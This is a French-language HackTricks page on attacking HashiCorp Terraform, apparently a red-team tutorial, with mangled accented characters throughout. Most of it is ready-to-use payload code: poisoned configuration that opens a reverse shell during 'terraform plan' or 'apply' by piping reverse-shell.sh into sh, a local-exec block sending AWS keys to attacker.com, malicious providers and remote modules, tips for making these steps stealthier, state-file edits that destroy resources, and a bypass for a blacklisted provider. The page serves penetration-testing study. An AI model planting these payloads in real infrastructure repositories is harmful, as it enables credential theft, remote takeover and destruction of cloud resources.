# S√©curit√© Terraform

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

### Informations de base

[Extrait des docs :](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform est un **outil d'infrastructure en tant que code** qui vous permet de d√©finir √† la fois des **ressources cloud et sur site** dans des fichiers de configuration lisibles par l'homme que vous pouvez versionner, r√©utiliser et partager. Vous pouvez ensuite utiliser un flux de travail coh√©rent pour provisionner et g√©rer toute votre infrastructure tout au long de son cycle de vie. Terraform peut g√©rer des composants de bas niveau comme les ressources de calcul, de stockage et de mise en r√©seau, ainsi que des composants de haut niveau comme les entr√©es DNS et les fonctionnalit√©s SaaS.

#### Comment fonctionne Terraform ?

Terraform cr√©e et g√®re des ressources sur des plateformes cloud et d'autres services via leurs interfaces de programmation d'applications (API). Les fournisseurs permettent √† Terraform de fonctionner avec pratiquement n'importe quelle plateforme ou service disposant d'une API accessible.

![](<../.gitbook/assets/image (177).png>)

HashiCorp et la communaut√© Terraform ont d√©j√† √©crit **plus de 1700 fournisseurs** pour g√©rer des milliers de types de ressources et de services diff√©rents, et ce nombre continue de cro√Ætre. Vous pouvez trouver tous les fournisseurs disponibles publiquement sur le [Terraform Registry](https://registry.terraform.io/), y compris Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, et bien d'autres.

Le flux de travail principal de Terraform se compose de trois √©tapes :

* **√âcrire :** Vous d√©finissez des ressources, qui peuvent √™tre r√©parties sur plusieurs fournisseurs et services cloud. Par exemple, vous pourriez cr√©er une configuration pour d√©ployer une application sur des machines virtuelles dans un r√©seau de Cloud Priv√© Virtuel (VPC) avec des groupes de s√©curit√© et un √©quilibreur de charge.
* **Planifier :** Terraform cr√©e un plan d'ex√©cution d√©crivant l'infrastructure qu'il va cr√©er, mettre √† jour ou d√©truire en fonction de l'infrastructure existante et de votre configuration.
* **Appliquer :** Sur approbation, Terraform effectue les op√©rations propos√©es dans le bon ordre, en respectant les d√©pendances des ressources. Par exemple, si vous mettez √† jour les propri√©t√©s d'un VPC et changez le nombre de machines virtuelles dans ce VPC, Terraform recr√©era le VPC avant de mettre √† l'√©chelle les machines virtuelles.

![](<../.gitbook/assets/image (215).png>)

### Laboratoire Terraform

Il vous suffit d'installer terraform sur votre ordinateur.

Voici un [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) et voici la [meilleure fa√ßon de t√©l√©charger terraform](https://www.terraform.io/downloads).

### RCE dans Terraform

Terraform **n'a pas de plateforme exposant une page web ou un service r√©seau** que nous pouvons √©num√©rer, donc, la seule fa√ßon de compromettre terraform est de **pouvoir ajouter/modifier des fichiers de configuration terraform**.

Cependant, terraform est un **composant tr√®s sensible** √† compromettre car il aura **un acc√®s privil√©gi√©** √† diff√©rents emplacements afin de fonctionner correctement.

Le principal moyen pour un attaquant de pouvoir compromettre le syst√®me o√π terraform fonctionne est de **compromettre le d√©p√¥t qui stocke les configurations terraform**, car √† un moment donn√©, elles vont √™tre **interpr√©t√©es**.

En fait, il existe des solutions qui **ex√©cutent automatiquement terraform plan/apply apr√®s qu'une PR** soit cr√©√©e, comme **Atlantis** :

{% content-ref url="atlantis-security.md" %}
[atlantis-security.md](atlantis-security.md)
{% endcontent-ref %}

Si vous parvenez √† compromettre un fichier terraform, il existe diff√©rentes fa√ßons de r√©aliser un RCE lorsque quelqu'un ex√©cute `terraform plan` ou `terraform apply`.

#### Terraform plan

Terraform plan est la **commande la plus utilis√©e** dans terraform et les d√©veloppeurs/solutions utilisant terraform l'appellent tout le temps, donc la **fa√ßon la plus simple d'obtenir un RCE** est de s'assurer que vous empoisonnez un fichier de configuration terraform qui ex√©cutera des commandes arbitraires dans un `terraform plan`.

**Utilisation d'un fournisseur externe**

Terraform propose le [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) qui fournit un moyen d'interfacer entre Terraform et des programmes externes. Vous pouvez utiliser la source de donn√©es `external` pour ex√©cuter du code arbitraire lors d'un `plan`.

Injecter dans un fichier de configuration terraform quelque chose comme ce qui suit ex√©cutera un shell invers√© lors de l'ex√©cution de `terraform plan` :
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Utilisation d'un fournisseur personnalis√©**

Un attaquant pourrait envoyer un [fournisseur personnalis√©](https://learn.hashicorp.com/tutorials/terraform/provider-setup) au [Terraform Registry](https://registry.terraform.io/) et ensuite l'ajouter au code Terraform dans une branche de fonctionnalit√© ([exemple ici](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Le fournisseur est t√©l√©charg√© dans l'`init` et ex√©cutera le code malveillant lorsque `plan` est ex√©cut√©.

Vous pouvez trouver un exemple dans [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Utilisation d'une r√©f√©rence externe**

Les deux options mentionn√©es sont utiles mais pas tr√®s discr√®tes (la seconde est plus discr√®te mais plus complexe que la premi√®re). Vous pouvez effectuer cette attaque m√™me de mani√®re **plus discr√®te**, en suivant ces suggestions :

* Au lieu d'ajouter le rev shell directement dans le fichier terraform, vous pouvez **charger une ressource externe** qui contient le rev shell :
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Vous pouvez trouver le code rev shell dans [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

* Dans la ressource externe, utilisez la fonctionnalit√© **ref** pour cacher le **code rev shell terraform dans une branche** √† l'int√©rieur du d√©p√¥t, quelque chose comme : `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

#### Terraform Apply

Terraform apply sera ex√©cut√© pour appliquer tous les changements, vous pouvez √©galement en abuser pour obtenir RCE en injectant **un fichier Terraform malveillant avec** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Vous devez juste vous assurer qu'une charge utile comme les suivantes se termine dans le fichier `main.tf` :
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Suivez les **suggestions de la technique pr√©c√©dente** pour effectuer cette attaque de mani√®re **plus discr√®te en utilisant des r√©f√©rences externes**.

### Secrets Dumps

Vous pouvez avoir **des valeurs secr√®tes utilis√©es par terraform extraites** en ex√©cutant `terraform apply` en ajoutant au fichier terraform quelque chose comme :
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Abusing Terraform State Files

Dans le cas o√π vous avez un acc√®s en √©criture sur les fichiers d'√©tat terraform mais ne pouvez pas modifier le code terraform, [**cette recherche**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) propose des options int√©ressantes pour tirer parti du fichier :

#### Deleting resources <a href="#deleting-resources" id="deleting-resources"></a>

Il existe 2 fa√ßons de d√©truire des ressources :

1. **Ins√©rer une ressource avec un nom al√©atoire dans le fichier d'√©tat pointant vers la vraie ressource √† d√©truire**

Parce que terraform verra que la ressource ne devrait pas exister, il la d√©truira (suivant l'ID de la vraie ressource indiqu√©). Exemple de la page pr√©c√©dente :
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modifier la ressource √† supprimer de mani√®re √† ce qu'il ne soit pas possible de mettre √† jour (afin qu'elle soit supprim√©e et recr√©√©e)**

Pour une instance EC2, modifier le type de l'instance suffit √† faire en sorte que terraform la supprime et la recr√©e.

#### RCE

Il est √©galement possible de [cr√©er un fournisseur personnalis√©](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) et de remplacer simplement l'un des fournisseurs dans le fichier d'√©tat terraform par le fournisseur malveillant ou d'ajouter une ressource vide avec le fournisseur malveillant. Exemple de la recherche originale :
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### Remplacer le fournisseur sur liste noire

Dans le cas o√π vous rencontrez une situation o√π `hashicorp/external` a √©t√© mis sur liste noire, vous pouvez r√©impl√©menter le fournisseur `external` en proc√©dant comme suit. Remarque : Nous utilisons un fork du fournisseur externe publi√© par https://registry.terraform.io/providers/nazarewk/external/latest. Vous pouvez √©galement publier votre propre fork ou r√©impl√©mentation.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Ensuite, vous pouvez utiliser `external` comme d'habitude.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
### Outils d'Audit

* [**tfsec**](https://github.com/aquasecurity/tfsec) : tfsec utilise l'analyse statique de votre code terraform pour rep√©rer les configurations incorrectes potentielles.
* [**terascan**](https://github.com/tenable/terrascan) : Terrascan est un analyseur de code statique pour l'Infrastructure as Code.

### R√©f√©rences

* [Atlantis Security](atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
* [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
* [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
